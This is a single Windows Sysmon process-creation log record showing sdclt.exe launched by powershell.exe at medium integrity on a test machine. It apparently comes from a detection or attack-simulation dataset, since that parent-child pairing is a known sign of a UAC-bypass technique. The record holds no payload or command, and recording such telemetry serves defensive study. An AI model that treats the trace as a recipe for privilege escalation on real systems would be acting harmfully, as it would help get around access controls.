ProcessGuid: 365ABB72-9DA4-5CD3-0000-00102E692F00
CommandLine: '""C:\Windows\system32\sdclt.exe"" '
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0x13add'
IntegrityLevel: Medium
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-09 03:25:24.583
"
